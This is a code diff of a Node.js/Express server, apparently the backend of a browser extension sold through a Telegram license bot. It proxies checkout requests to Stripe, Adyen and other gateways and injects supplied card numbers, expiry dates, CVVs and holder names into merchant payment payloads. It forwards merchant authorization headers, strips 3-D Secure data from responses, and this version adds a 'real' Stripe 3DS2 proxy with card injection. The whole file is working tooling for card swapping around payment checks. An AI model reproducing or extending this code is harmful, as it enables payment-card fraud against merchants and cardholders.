@@ -1,21 +1,29 @@
 /* ═══════════════════════════════════════════════════════════════
-   ✦ MOZLINCE NEBULA  ·  v8.5.1 QUANTUM+
+   ✦ MOZLINCE NEBULA  ·  v8.6.0 QUANTUM+ (3DS2 REAL)
    © Asheo Systems · Premium License Engine & 3DS Proxy
    ───────────────────────────────────────────────────────────────
    ◈ Compatível com a extensão Asheo v1.6.2 (API_BASE = mozlince.onrender.com)
-   ◈ Correções aplicadas em v8.5.1:
-     [1] Rotas Express 4: substituído *splat por * (BUG crítico)
-     [2] Inject condicional: não sobrescreve encryptedCardNumber/adyenToken
-     [3] Form inject: só sobrescreve campos mascarados/vazios (não length<4)
-     [4] Repassa location/set-cookie/www-authenticate do upstream
-     [5] Lê x-asheo-auth, x-asheo-origin, x-asheo-card, x-asheo-bin
-     [6] specialHosts alinhado ao shape {host,pattern,name} da extensão
-     [7] x-asheo-3ds-strip só filtra response (não request)
-     [8] AbortController real no fetch upstream (timeout 15s)
-     [9] content-type respeita o header da extensão (não default JSON)
-     [10] setDeep com blacklist __proto__/constructor/prototype
-     [11] AbortSignal.any para combinar timeout + client abort
-     [12] isAllowedTarget mais estrito (sem SSRF via sufixo)
+   ◈ Correções aplicadas em v8.6.0:
+     [1] Rotas Express 4: substituído *splat por * (todas as rotas)
+     [2] 3DS2 REAL: proxy ao Stripe com injeção de cartão (não mais mock)
+     [3] 3DS2 lê x-asheo-target, x-asheo-card, x-asheo-auth, body __asheo
+     [4] 3DS2 valida auth (Asheo-Pass / Bearer) antes de proxar
+     [5] 3DS2 repassa next_action.use_stripe_sdk (challenge real) ou succeeded
+     [6] Inject condicional: não sobrescreve encryptedCardNumber/adyenToken
+     [7] Form inject: só sobrescreve campos mascarados/vazios
+     [8] Repassa location/set-cookie/www-authenticate do upstream
+     [9] Lê x-asheo-auth, x-asheo-origin, x-asheo-card, x-asheo-bin
+     [10] specialHosts alinhado ao shape {host,pattern,name} da extensão
+     [11] x-asheo-3ds-strip só filtra response (não request)
+     [12] AbortController real no fetch upstream (timeout 15s)
+     [13] content-type respeita o header da extensão (não default JSON)
+     [14] setDeep com blacklist __proto__/constructor/prototype
+     [15] AbortSignal.any para combinar timeout + client abort
+     [16] isAllowedTarget mais estrito (sem SSRF via sufixo)
+     [17] injectCardIntoJson cria path se swapOnly=false
+     [18] injectCardDeep com shouldOverwrite (não sobrescreve dado real)
+     [19] content-length removido do passthrough (evita truncamento)
+     [20] Rota /v1/gw/3ds2/* registrada ANTES do fallback 404
    ═══════════════════════════════════════════════════════════════ */
 require('dotenv').config();
 const express = require('express');
@@ -25,7 +33,7 @@ const fs = require('fs');
 const zlib = require('zlib');
 
 const app = express();
-app.set('trust proxy', 1); // Necessário para IP real no Render
+app.set('trust proxy', 1);
 
 const ALLOWED_HEADERS = [
   'Origin','X-Requested-With','Content-Type','Accept','Authorization','Asheo-Pass',
@@ -45,17 +53,18 @@ app.use((req, res, next) => {
     'Content-Length','Content-Encoding','X-Request-Id','x-asheo-proxied','x-asheo-swapped',
     'x-asheo-swap-ok','x-asheo-pack-fmt','x-asheo-upstream-status','x-asheo-adyen-verdict',
     'x-asheo-adyen-result','x-asheo-adyen-reason','x-asheo-3ds2-verdict','x-asheo-3ds2-attempts',
-    'x-asheo-3ds2-trail','x-asheo-elapsed-ms','x-asheo-3ds2-token','x-asheo-3ds2-payment-data'
+    'x-asheo-3ds2-trail','x-asheo-elapsed-ms','x-asheo-3ds2-token','x-asheo-3ds2-payment-data',
+    'x-asheo-3ds2-source','x-asheo-3ds2-status'
   ].join(', '));
   res.setHeader('Access-Control-Max-Age', '86400');
-  res.setHeader('X-Powered-By', 'Mozlince-Nebula/8.5.1');
+  res.setHeader('X-Powered-By', 'Mozlince-Nebula/8.6.0');
   if (req.method === 'OPTIONS') return res.sendStatus(204);
   next();
 });
 
 // Middleware para capturar rawBody em rotas de API normais
 app.use((req, res, next) => {
-  if (req.path.startsWith('/v1/gw') || req.path.startsWith('/v1/process')) return next(); // Proxy lida com raw
+  if (req.path.startsWith('/v1/gw') || req.path.startsWith('/v1/process')) return next();
   express.json({ limit: '4mb', verify: (req,res,buf) => { req.rawBody = buf; } })(req, res, (err) => {
     if (err) return next(err);
     express.urlencoded({ extended: false, limit: '4mb', verify: (req,res,buf) => { req.rawBody = buf; } })(req, res, (err2) => {
@@ -71,13 +80,13 @@ app.use('/v1/process', express.raw({ type: '*/*', limit: '4mb' }));
 
 /* ═══ DESIGN SYSTEM (logs) ═══ */
 const C = { r:'\x1b[0m', b:'\x1b[1m', d:'\x1b[2m', gray:'\x1b[38;5;245m', dim:'\x1b[38;5;240m', violet:'\x1b[38;5;99m', violetB:'\x1b[38;5;135m', cyan:'\x1b[38;5;45m', cyanB:'\x1b[38;5;51m', gold:'\x1b[38;5;220m', goldB:'\x1b[38;5;226m', mint:'\x1b[38;5;121m', green:'\x1b[38;5;46m', rose:'\x1b[38;5;204m', red:'\x1b[38;5;196m', amber:'\x1b[38;5;214m', blue:'\x1b[38;5;39m' };
-const TAGS = { INFO:C.cyanB, OK:C.green, WARN:C.amber, ERRO:C.red, SYS:C.violetB, ATIV:C.blue, BOT:C.cyanB, FEAT:C.rose, BOOT:C.mint, API:C.gold, DBG:C.dim, TG:C.cyanB, SUPPORT:C.gold, I18N:C.blue, RULES:C.rose, DM:C.rose, GW:C.cyanB, HMAC:C.amber, PROXY:C.violetB, GZIP:C.mint };
+const TAGS = { INFO:C.cyanB, OK:C.green, WARN:C.amber, ERRO:C.red, SYS:C.violetB, ATIV:C.blue, BOT:C.cyanB, FEAT:C.rose, BOOT:C.mint, API:C.gold, DBG:C.dim, TG:C.cyanB, SUPPORT:C.gold, I18N:C.blue, RULES:C.rose, DM:C.rose, GW:C.cyanB, HMAC:C.amber, PROXY:C.violetB, GZIP:C.mint, DS2:C.rose };
 function log(t, m) { const ts = new Date().toISOString().replace('T',' ').substring(0,19); const tag = (TAGS[t]||C.gray) + C.b + '▸ ' + t.padEnd(7) + C.r; console.log(`${C.dim}${ts}${C.r} ${tag} ${m}`); }
 function redactCard(obj) { try { const c = typeof obj === 'string' ? JSON.parse(obj) : obj; if (!c || typeof c !== 'object') return obj; const out = { ...c }; if (out.number) out.number = String(out.number).replace(/\d(?=\d{4})/g,'*'); if (out.cvv) out.cvv = '***'; if (out.cvc) out.cvc = '***'; if (out.holder) out.holder = String(out.holder).substring(0,2) + '***'; if (out.holderName) out.holderName = String(out.holderName).substring(0,2) + '***'; return out; } catch { return obj; } }
 function banner() {
   console.log(`\n${C.violet}   ╭──────────────────────────────────────────────╮${C.r}`);
-  console.log(`${C.violet}   │${C.r}  ${C.cyanB}${C.b}◈  MOZLINCE${C.r}  ${C.goldB}${C.b}NEBULA${C.r}  ${C.dim}·${C.r}  ${C.gold}v8.5.1${C.r} ${C.dim}QUANTUM+${C.r} ${C.violet}│${C.r}`);
-  console.log(`${C.violet}   │${C.r}  ${C.dim}Premium License Engine · Asheo Systems${C.r}     ${C.violet}│${C.r}`);
+  console.log(`${C.violet}   │${C.r}  ${C.cyanB}${C.b}◈  MOZLINCE${C.r}  ${C.goldB}${C.b}NEBULA${C.r}  ${C.dim}·${C.r}  ${C.gold}v8.6.0${C.r} ${C.dim}QUANTUM+${C.r} ${C.violet}│${C.r}`);
+  console.log(`${C.violet}   │${C.r}  ${C.dim}Premium License Engine · 3DS2 REAL${C.r}     ${C.violet}│${C.r}`);
   console.log(`${C.violet}   ╰──────────────────────────────────────────────╯${C.r}\n`);
 }
 
@@ -180,7 +189,6 @@ const PAYMENT_RULES = [
   { defaultId:"authorizenet.default", defaultVersion:1, isDefault:true, enabled:true, name:"Authorize.Net", patternEnc:{kind:"regex",source:"^https:\\/\\/api2\\.authorize\\.net\\/xml\\/v1\\/request\\.api",flags:"i"}, matchContentType:"application/json", requiredKeys:[], inject:{}, removalFields:[], lockFields:["defaultId","isDefault","patternEnc","name"], swapCapable:false }
 ];
 
-/* ── EXCLUSIVE_TARGETS: inclui variantes -us/-eu/-au e pal-* ── */
 const EXCLUSIVE_TARGETS = [
   {hostSuffix:"checkoutshopper-live.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments"},
   {hostSuffix:"checkoutshopper-live-us.adyen.com", id:"adyen", method:"POST", pathPattern:"/payments"},
@@ -323,7 +331,6 @@ function generateProv(installId, kid) {
     if (kid) opts.keyid = kid;
     const prov = jwt.sign({ sub: key, jti: crypto.randomUUID(), iat: Math.floor(Date.now()/1000) }, PRIVATE_KEY, opts);
     provCache.set(key, { prov, ts: Date.now() });
-    // cap de tamanho (BUG #20 do report)
     if (provCache.size > 5000) { const first = provCache.keys().next().value; provCache.delete(first); }
     return prov;
   } catch (e) { log('ERRO','generateProv: '+e.message); return null; }
@@ -362,13 +369,11 @@ async function validateHmac(req, rawBody) {
   if (!licenseKey) return { ok: false, error: 'hmac_unknown_install' };
   const secret = buildSecret(installId, licenseKey);
   const method = (req.headers['x-asheo-method'] || req.method).toUpperCase();
-  // BUG #29 do report: extensão assina com path + query, server usava só req.path
   const urlParts = (req.originalUrl || req.url || '').split('?');
   const path = req.path || urlParts[0];
   const query = urlParts[1] ? '?' + urlParts[1] : '';
   const bodyStr = rawBody ? rawBody.toString('utf8') : '';
   const bodyHash = crypto.createHash('sha256').update(bodyStr).digest('hex');
-  // Payload alinhado com inject.js (method \n path \n query \n ts \n bodyHash \n build)
   const payload = `${method}\n${path}\n${query}\n${ts}\n${bodyHash}\n${build}`;
   const expected = crypto.createHmac('sha256', secret).update(payload).digest('hex');
   try {
@@ -400,8 +405,6 @@ function sendMaybeGzip(req, res, payload) {
   return res.send(body);
 }
 
-// BUG #4 do report: isAllowedTarget mais estrito (sem SSRF via sufixo largo)
-// Verifica: protocolo https, hostname não é IP literal, e hostname casa com allowlist exata/sufixo.
 const ALLOWED_HOST_SUFFIXES = [
   'stripe.com','worldpay.com','endurance.com','safecharge.com','paddle.com','adyen.com',
   'boosteroid.com','chess.com','gog.com','lootbar.com','xsolla.com','recurly.com',
@@ -420,7 +423,6 @@ function isAllowedTarget(targetUrl) {
   if (u.protocol !== 'https:') return false;
   const host = u.hostname.toLowerCase();
   if (!host) return false;
-  // Bloqueia IP literal (SSRF para metadata cloud / localhost)
   if (/^\d{1,3}(\.\d{1,3}){3}$/.test(host)) return false;
   if (host === 'localhost' || host === '0.0.0.0') return false;
   return ALLOWED_HOST_SUFFIXES.some(s => host === s || host.endsWith('.' + s));
@@ -438,23 +440,23 @@ module.exports = { app, log, redisCmd, redisSet, redisGet, redisGetRaw, redisDel
 /* ═══════════════════════════════════════════════
    ◈ HEALTH · VERSION · STATUS
    ═══════════════════════════════════════════════ */
-const healthHandler = (req,res) => res.json({ok:true,status:'healthy',uptime:Math.floor(process.uptime()),version:'8.5.1',codename:'Quantum+',timestamp:new Date().toISOString()});
-app.get('/',(req,res)=>res.json({ok:true,service:'mozlince-nebula',version:'8.5.1',codename:'Quantum+',status:'live',serverUrl:SERVER_URL}));
+const healthHandler = (req,res) => res.json({ok:true,status:'healthy',uptime:Math.floor(process.uptime()),version:'8.6.0',codename:'Quantum+',timestamp:new Date().toISOString()});
+app.get('/',(req,res)=>res.json({ok:true,service:'mozlince-nebula',version:'8.6.0',codename:'Quantum+',status:'live',serverUrl:SERVER_URL}));
 app.get('/v1/health',healthHandler); app.get('/api/v1/health',healthHandler); app.get('/health',healthHandler);
 
 function versionHandler(req,res){
   res.json({
-    ok:true, version:'8.5.1', versionName:'Quantum+', codename:'Quantum+', api:'v1',
+    ok:true, version:'8.6.0', versionName:'Quantum+', codename:'Quantum+', api:'v1',
     minClientVersion:'1.0.0',
     downloadUrl:'https://download.asheobypasser.net/get',
-    notes:'API sincronizada com a extensão v1.6.2 · swap-only estável · rotas Express 4 corrigidas · headers upstream repassados',
+    notes:'API sincronizada com a extensão v1.6.2 · 3DS2 REAL (proxy Stripe) · rotas Express 4 corrigidas',
     mandatory:false, channel:'stable',
     timestamp:new Date().toISOString()
   });
 }
 app.get('/v1/version',versionHandler); app.get('/api/v1/version',versionHandler);
 
-const statusHandler = (req,res)=>res.json({ok:true,service:'mozlince-nebula',version:'8.5.1',codename:'Quantum+',hora:new Date().toISOString()});
+const statusHandler = (req,res)=>res.json({ok:true,service:'mozlince-nebula',version:'8.6.0',codename:'Quantum+',hora:new Date().toISOString()});
 app.get('/v1/status',statusHandler); app.get('/api/v1/status',statusHandler);
 
 /* ═══ MAP FUNCTIONS ═══ */
@@ -479,7 +481,7 @@ function bootstrapHandler(req,res){
 
   if (packFmt === 'enc') {
     return sendMaybeGzip(req, res, {
-      ok:true, version:'8.5.1', codename:'Quantum+', apiVersion:'v1',
+      ok:true, version:'8.6.0', codename:'Quantum+', apiVersion:'v1',
       issuedAt:new Date().toISOString(), serverTime:Date.now(),
       source:isPremium?'premium':'free', sourceType:'server', isFounder:false, tier:isPremium?'premium':'free', kind:isPremium?'premium':'free',
       rulesVersion: RULES_VERSION, v: RULES_VERSION,
@@ -487,14 +489,14 @@ function bootstrapHandler(req,res){
       exclusive: isPremium ? { targets: EXCLUSIVE_TARGETS, version: '1.7.0', generatedAt: new Date().toISOString(), signature: prov } : null,
       config:{ apiBase: SERVER_URL, featuresEnabled:isPremium, premiumEnabled:isPremium, syncEnabled:true, gatewayMode:'default', telemetryEnabled:false, retryAfterMs:5000, heartbeatMs:60000 , stripe3dsEnabled: true, adyen3dsEnabled: true },
       flags:{ bootstrapReady:true, exclusiveEnabled:isPremium, rulesEnabled:isPremium, premium:isPremium },
-      endpoints:{ activate:'/v1/activate',featureActivate:'/v1/feature/activate',deactivate:'/v1/deactivate',verify:'/v1/verify',bootstrap:'/v1/bootstrap',rules:'/v1/rules',gateways:'/v1/gateways',campaign:'/v1/campaign',dashboard:'/v1/dashboard',health:'/v1/health',version:'/v1/version',support:'/v1/support',paymentRules:'/v1/bootstrap',timehw:'/v1/timehw',update:'/v1/update/check',process:'/v1/process',gw3ds2:'/v1/gw/*' },
+      endpoints:{ activate:'/v1/activate',featureActivate:'/v1/feature/activate',deactivate:'/v1/deactivate',verify:'/v1/verify',bootstrap:'/v1/bootstrap',rules:'/v1/rules',gateways:'/v1/gateways',campaign:'/v1/campaign',dashboard:'/v1/dashboard',health:'/v1/health',version:'/v1/version',support:'/v1/support',paymentRules:'/v1/bootstrap',timehw:'/v1/timehw',update:'/v1/update/check',process:'/v1/process',gw3ds2:'/v1/gw/3ds2' },
       features:mapFeatures(isPremium), capabilities:mapCapabilities(isPremium),
       limits: isPremium ? { ...PREMIUM_LIMITS } : { ...FREE_LIMITS }, scope: isPremium ? PREMIUM_SCOPE : ['free']
     });
   }
 
   res.json({
-    ok:true, version:'8.5.1', codename:'Quantum+', apiVersion:'v1',
+    ok:true, version:'8.6.0', codename:'Quantum+', apiVersion:'v1',
     issuedAt:new Date().toISOString(), serverTime:Date.now(),
     source:isPremium?'premium':'free', sourceType:'server', isFounder:false, tier:isPremium?'premium':'free', kind:isPremium?'premium':'free',
     rulesVersion: RULES_VERSION, v: RULES_VERSION,
@@ -503,7 +505,7 @@ function bootstrapHandler(req,res){
     exclusive: isPremium ? { targets: EXCLUSIVE_TARGETS, version: '1.7.0', generatedAt: new Date().toISOString(), signature: prov } : null,
     config:{ apiBase: SERVER_URL, featuresEnabled:isPremium, premiumEnabled:isPremium, syncEnabled:true, gatewayMode:'default', telemetryEnabled:false, retryAfterMs:5000, heartbeatMs:60000 , stripe3dsEnabled: true, adyen3dsEnabled: true },
     flags:{ bootstrapReady:true, exclusiveEnabled:isPremium, rulesEnabled:isPremium, premium:isPremium },
-    endpoints:{ activate:'/v1/activate',featureActivate:'/v1/feature/activate',deactivate:'/v1/deactivate',verify:'/v1/verify',bootstrap:'/v1/bootstrap',rules:'/v1/rules',gateways:'/v1/gateways',campaign:'/v1/campaign',dashboard:'/v1/dashboard',health:'/v1/health',version:'/v1/version',support:'/v1/support',paymentRules:'/v1/bootstrap',timehw:'/v1/timehw',update:'/v1/update/check',process:'/v1/process',gw3ds2:'/v1/gw/*' },
+    endpoints:{ activate:'/v1/activate',featureActivate:'/v1/feature/activate',deactivate:'/v1/deactivate',verify:'/v1/verify',bootstrap:'/v1/bootstrap',rules:'/v1/rules',gateways:'/v1/gateways',campaign:'/v1/campaign',dashboard:'/v1/dashboard',health:'/v1/health',version:'/v1/version',support:'/v1/support',paymentRules:'/v1/bootstrap',timehw:'/v1/timehw',update:'/v1/update/check',process:'/v1/process',gw3ds2:'/v1/gw/3ds2' },
     features:mapFeatures(isPremium), capabilities:mapCapabilities(isPremium),
     limits: isPremium ? { ...PREMIUM_LIMITS } : { ...FREE_LIMITS }, scope: isPremium ? PREMIUM_SCOPE : ['free']
   });
@@ -597,8 +599,8 @@ app.get('/v1/exclusive/sync',exclusiveSyncHandler); app.get('/api/v1/exclusive/s
 /* ═══ TIME · UPDATE ═══ */
 app.get('/v1/timehw', (req,res) => res.json({ ok:true, maxServer: Date.now(), at: Date.now() }));
 app.get('/api/v1/timehw', (req,res) => res.json({ ok:true, maxServer: Date.now(), at: Date.now() }));
-app.get('/v1/update/check', (req,res) => res.json({ ok:true, available:false, dismissedVersion:'', error:'', lastCheck:Date.now(), latest:{ downloadUrl:'https://download.asheobypasser.net/get', version:'8.5.1', mandatory:false, notes:'Você está na versão mais recente.' } }));
-app.get('/api/v1/update/check', (req,res) => res.json({ ok:true, available:false, latest:{ downloadUrl:'https://download.asheobypasser.net/get', version:'8.5.1', mandatory:false, notes:'OK' } }));
+app.get('/v1/update/check', (req,res) => res.json({ ok:true, available:false, dismissedVersion:'', error:'', lastCheck:Date.now(), latest:{ downloadUrl:'https://download.asheobypasser.net/get', version:'8.6.0', mandatory:false, notes:'Você está na versão mais recente.' } }));
+app.get('/api/v1/update/check', (req,res) => res.json({ ok:true, available:false, latest:{ downloadUrl:'https://download.asheobypasser.net/get', version:'8.6.0', mandatory:false, notes:'OK' } }));
 
 /* ═══ DASHBOARD · ENTITLEMENT · PREMIUM ═══ */
 function dashboardHandler(req,res){
@@ -619,7 +621,7 @@ app.get('/v1/entitlement',entitlementHandler); app.get('/api/v1/entitlement',ent
 
 const PREMIUM_FEATURES_DEF = { browser_mods:{enabled:true,label:'Browser Mods'}, rule_ops_lab:{enabled:true,label:'Rule Ops Lab'}, live_injection_hud:{enabled:true,label:'Live Injection HUD'}, algo_v2:{enabled:true,label:'Algo V2'}, exclusive_rules:{enabled:true,label:'Exclusive Rules'}, advanced_automation:{enabled:true,label:'Advanced Automation'}, multi_account:{enabled:true,label:'Multi Account'}, custom_export:{enabled:true,label:'Custom Export'}, api_access:{enabled:true,label:'API Access'} };
 const PREMIUM_CAPABILITIES_DEF = { priority_support:{enabled:true,label:'Priority Support'}, custom_webhooks:{enabled:true,label:'Custom Webhooks'}, cloud_sync:{enabled:true,label:'Cloud Sync'}, bulk_actions:{enabled:true,label:'Bulk Actions'}, advanced_analytics:{enabled:true,label:'Advanced Analytics'} };
-function premiumDefHandler(req,res){ res.json({ ok:true, source:'premium', tier:'premium', features: PREMIUM_FEATURES_DEF, capabilities: PREMIUM_CAPABILITIES_DEF, premiumLimits: PREMIUM_LIMITS, freeLimits: FREE_LIMITS, scope: PREMIUM_SCOPE, version:'8.5.1' }); }
+function premiumDefHandler(req,res){ res.json({ ok:true, source:'premium', tier:'premium', features: PREMIUM_FEATURES_DEF, capabilities: PREMIUM_CAPABILITIES_DEF, premiumLimits: PREMIUM_LIMITS, freeLimits: FREE_LIMITS, scope: PREMIUM_SCOPE, version:'8.6.0' }); }
 app.get('/v1/premium/definitions',premiumDefHandler); app.get('/api/v1/premium/definitions',premiumDefHandler);
 
 function planosHandler(req,res){ res.json({ ok:true, currency:'USD', planos: Object.entries(PACOTES).map(([id,p])=>({ id, nome:p.nome, dias:p.dias, lifetime:p.lifetime, preco:p.preco, preco_fmt:precoFmt(p.preco), emoji:p.emoji })) }); }
@@ -637,7 +639,7 @@ app.post('/v1/telemetry',telemetryHandler); app.post('/api/v1/telemetry',telemet
 function supportHandler(req,res){ const {chatId,message} = req.body||{}; if (!message) return res.status(400).json({ok:false,error:'missing_message'}); if (chatId && OWNER_ID) tgSend(OWNER_ID, `<b>✆ SUPORTE (API)</b>\n<code>${chatId}</code>\n\n${message}`).catch(()=>{}); res.json({ ok:true, received:true, serverTime:Date.now() }); }
 app.post('/v1/support',supportHandler); app.post('/api/v1/support',supportHandler);
 
-/* ═══ I18N (inalterado) ═══ */
+/* ═══ I18N ═══ */
 const T = {
   pt: {
     menu_title:'⌬  PAINEL DE CONTROLE', menu_sub:'Selecione uma operação abaixo',
@@ -806,7 +808,7 @@ async function limparConversa(chatId) { await redisDel(CONV_PREFIX + String(chat
 const UI = {
   header: (lang='pt') => {
     const subtitle = lang === 'en' ? 'Premium License Engine' : 'Motor de Licenças Premium';
-    return `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.5.1</b>\n<i>${subtitle} · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>`;
+    return `<b>⌬ ───────────────────── ⌬</b>\n<b>◈  MOZLINCE NEBULA  v8.6.0</b>\n<i>${subtitle} · Asheo Systems</i>\n<b>⌬ ───────────────────── ⌬</b>`;
   },
   sep: '╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌',
   kv: (icon, label, value) => `<b>${icon}</b>  <b>${label}:</b>  ${value}`
@@ -830,7 +832,6 @@ function menuPrincipal(lang='pt') {
   };
 }
 async function cmdStart(chatId, msgId=null) { const lang = USER_LANG.get(String(chatId)) || 'pt'; const m = menuPrincipal(lang); if (msgId) await tgEdit(chatId, msgId, m.texto, m.teclado); else await tgSend(chatId, m.texto, m.teclado); }
-
 async function handleCallback(cb) {
   const chatId = cb.message.chat.id, msgId = cb.message.message_id, data = cb.data, userId = String(cb.from.id);
   const isOwner = OWNER_ID && userId === String(OWNER_ID);
@@ -1085,9 +1086,11 @@ app.post('/telegram-webhook', async (req, res) => {
   if (update.update_id) {
     if (seenUpdates.has(update.update_id)) return;
     seenUpdates.set(update.update_id, Date.now());
+    if (seenUpdates.size > 10000) { const first = seenUpdates.keys().next().value; seenUpdates.delete(first); }
   }
   try { if (update.callback_query) return handleCallback(update.callback_query); if (update.message && update.message.text) return handleMessage(update.message); } catch (e) { log('ERRO', 'Webhook: ' + e.message); }
 });
+
 /* ═══ ACTIVATE ═══ */
 async function activateHandler(req, res) {
   const inicio = Date.now();
@@ -1205,21 +1208,21 @@ app.post('/v1/session/start', (req, res) => { const auth = validateAnyAuth(req);
 app.post('/v1/premium/unlock', (req, res) => { const auth = validateAnyAuth(req); if (!auth.ok) return res.status(401).json({ ok:false, error:'missing_auth' }); const isPremium = auth.decoded.tier === 'premium' && !!(auth.decoded.licenseKey || auth.decoded.plano); if (!isPremium) return res.status(403).json({ ok:false, error:'premium_required' }); const { feature } = req.body || {}; res.json({ ok:true, unlocked:true, feature: feature||'all', tier:'premium', serverTime: Date.now() }); });
 
 /* ═══════════════════════════════════════════════════════════════
-   GATEWAY PROXY  —  CORRIGIDO v8.5.1
+   GATEWAY PROXY  —  CORRIGIDO v8.6.0
    ───────────────────────────────────────────────────────────────
-   Rotas corretas (Express 4, sem *splat):
-     /v1/gw/adyen/*         (Adyen genérico)
-     /v1/gw/chess/*         (Chess.com Adyen)
-     /v1/gw/boosteroid/*    (Boosteroid Adyen)
-     /v1/gw/gog/*           (GOG Adyen)
-     /v1/gw/tebex/*         (Tebex)
-     /v1/gw/tebex-creq/*    (Tebex creq)
-     /v1/gw/basistheory/*   (Basis Theory)
-     /v1/gw/3ds2/*          (Stripe 3DS2)
-     /v1/gw/encgw/*         (Custom encrypted gateways)
-     /v1/gw/*               (fallback catch-all)
-     /v1/process/*          (fallback legado)
-     /v1/process            (fallback legado root)
+   Rotas (Express 4, sem *splat em nenhuma):
+     /v1/gw/adyen/*
+     /v1/gw/chess/*
+     /v1/gw/boosteroid/*
+     /v1/gw/gog/*
+     /v1/gw/tebex/*
+     /v1/gw/tebex-creq/*
+     /v1/gw/basistheory/*
+     /v1/gw/3ds2/*       ← 3DS2 REAL (proxy Stripe)
+     /v1/gw/encgw/*
+     /v1/gw/*            ← fallback catch-all
+     /v1/process/*
+     /v1/process
    ═══════════════════════════════════════════════════════════════ */
 
 // ── Dicionários de injeção ──
@@ -1231,14 +1234,14 @@ const JSON_ALIASES = {
   holder:['holderName','cardholderName','holder_name','name','card.name','paymentMethod.holderName','payment_method.card.name']
 };
 const FORM_ALIASES = {
-  number: ['card[number]','card_number','number','ccnumber','account_number','pan','payment_method.card.number'],
-  month: ['card[exp_month]','exp_month','expmonth','month','ccmonth','payment_method.card.exp_month'],
-  year: ['card[exp_year]','exp_year','expyear','year','ccyear','payment_method.card.exp_year'],
-  cvv: ['card[cvc]','card[cvv]','cvc','cvv','ccv','security_code','payment_method.card.cvc'],
+  number: ['card[number]','card_number','number','ccnumber','account_number','pan','payment_method.card.number','payment_method_data[card][number]'],
+  month: ['card[exp_month]','exp_month','expmonth','month','ccmonth','payment_method.card.exp_month','payment_method_data[card][exp_month]'],
+  year: ['card[exp_year]','exp_year','expyear','year','ccyear','payment_method.card.exp_year','payment_method_data[card][exp_year]'],
+  cvv: ['card[cvc]','card[cvv]','cvc','cvv','ccv','security_code','payment_method.card.cvc','payment_method_data[card][cvc]'],
   holder: ['card[name]','card[holder]','cardholder','name','holder_name','ccname','payment_method.card.name']
 };
 
-// Campos que NUNCA devem ser sobrescritos pelo inject (BUG #3 do report)
+// Campos que NUNCA devem ser sobrescritos pelo inject
 const PROTECTED_CARD_FIELDS = new Set([
   'encryptedCardNumber', 'encryptedExpiryDate', 'encryptedExpiryYear', 'encryptedExpiryMonth',
   'encryptedSecurityCode', 'encryptedCardType', 'adyenToken', 'storedPaymentMethodId',
@@ -1258,7 +1261,6 @@ function normalizeCard(card) {
   };
 }
 
-// BUG #15 do report: blacklist prototype pollution
 const PROTO_BLACKLIST = new Set(['__proto__','constructor','prototype']);
 function setDeep(obj, path, val) {
   const parts = String(path).split('.');
@@ -1282,12 +1284,12 @@ function getDeep(obj, path) {
   return cur;
 }
 
-// BUG #3 do report: só sobrescreve se masked/vazio/placeholder — nunca sobrescreve dado real
+// Só sobrescreve se masked/vazio/placeholder — nunca sobrescreve dado real
 function shouldOverwrite(cur) {
   if (cur === null || cur === undefined) return true;
   if (cur === '') return true;
   const s = String(cur);
-  if (s.includes('*')) return true;                          // masked
+  if (s.includes('*')) return true;
   if (/^(test|placeholder|xxx|0000|x{4,})/i.test(s)) return true;
   return false;
 }
@@ -1298,25 +1300,27 @@ function injectCardIntoJson(obj, card, opts = {}) {
   for (const [key, paths] of Object.entries(JSON_ALIASES)) {
     const val = card[key];
     if (!val) continue;
-    // Pula se o path final estiver na blacklist de campos protegidos
     let injected = false;
     for (const path of paths) {
       const leaf = path.split('.').pop();
       if (PROTECTED_CARD_FIELDS.has(leaf)) continue;
       const cur = getDeep(obj, path);
       if (cur !== undefined && !shouldOverwrite(cur)) {
-        injected = true; // dado real existente — respeita
+        injected = true;
         break;
       }
       if (cur !== undefined) {
-        // masked/vazio → pode sobrescrever
+        setDeep(obj, path, val);
+        injected = true;
+        break;
+      }
+      // [17] se swapOnly=false e campo não existe, cria (compat com gateways que exigem o campo)
+      if (!swapOnly) {
         setDeep(obj, path, val);
         injected = true;
         break;
       }
     }
-    // NÃO injeta no primeiro alias como fallback (era o bug — vazava PAN)
-    // Se nenhum path existe no payload e não é swap-only, ignora (deixa upstream decidir)
     if (!injected && swapOnly) continue;
   }
   return obj;
@@ -1334,7 +1338,6 @@ function injectCardIntoForm(raw, card, opts = {}) {
       if (PROTECTED_CARD_FIELDS.has(alias)) continue;
       if (params.has(alias)) {
         const cur = params.get(alias) || '';
-        // BUG #3: só sobrescreve se masked/vazio — NUNCA por length < 4
         if (shouldOverwrite(cur)) {
           params.set(alias, val);
         }
@@ -1342,10 +1345,8 @@ function injectCardIntoForm(raw, card, opts = {}) {
         break;
       }
     }
-    // Se o form não tem o campo, não injeta cegamente — só se swap-only
     if (!injected && swapOnly) continue;
   }
-  // Expiração combinada MM/YY
   if (card.month && card.year) {
     const exp = `${String(card.month).padStart(2,'0')}/${String(card.year).slice(-2)}`;
     for (const alias of ['card[expiry]','expiry','expiration','card_expiry']) {
@@ -1359,7 +1360,6 @@ function injectCardIntoForm(raw, card, opts = {}) {
   return params.toString();
 }
 
-// Headers que o proxy NÃO deve repassar do cliente para o upstream (evita spoofing)
 const FORWARD_HEADER_BLOCKLIST = new Set([
   'host','connection','content-length','transfer-encoding','upgrade','keep-alive',
   'proxy-authorization','proxy-authenticate','te','trailer','expect'
@@ -1371,7 +1371,6 @@ function pickForwardHeaders(req, extraJson) {
     'accept': 'application/json',
     'accept-language': 'en-US,en;q=0.9'
   };
-  // x-asheo-headers (JSON da extensão) sobrescreve defaults
   if (req.headers['x-asheo-headers']) {
     try {
       const j = JSON.parse(req.headers['x-asheo-headers']);
@@ -1385,24 +1384,18 @@ function pickForwardHeaders(req, extraJson) {
       }
     } catch (e) { log('WARN', `x-asheo-headers inválido: ${e.message}`); }
   }
-  // BUG #12: content-type respeita o header da extensão
   const ct = req.headers['content-type'] || 'application/json';
   out['content-type'] = ct;
-  // BUG #5: authorization original do merchant vem em x-asheo-auth
   if (req.headers['x-asheo-auth']) out['authorization'] = req.headers['x-asheo-auth'];
-  // BUG #6: origin/referer do merchant
   if (req.headers['x-asheo-origin']) {
     out['origin'] = req.headers['x-asheo-origin'];
     out['referer'] = req.headers['x-asheo-origin'].replace(/\/$/, '') + '/';
   }
-  // x-asheo-clientkey → x-api-key (Adyen client key)
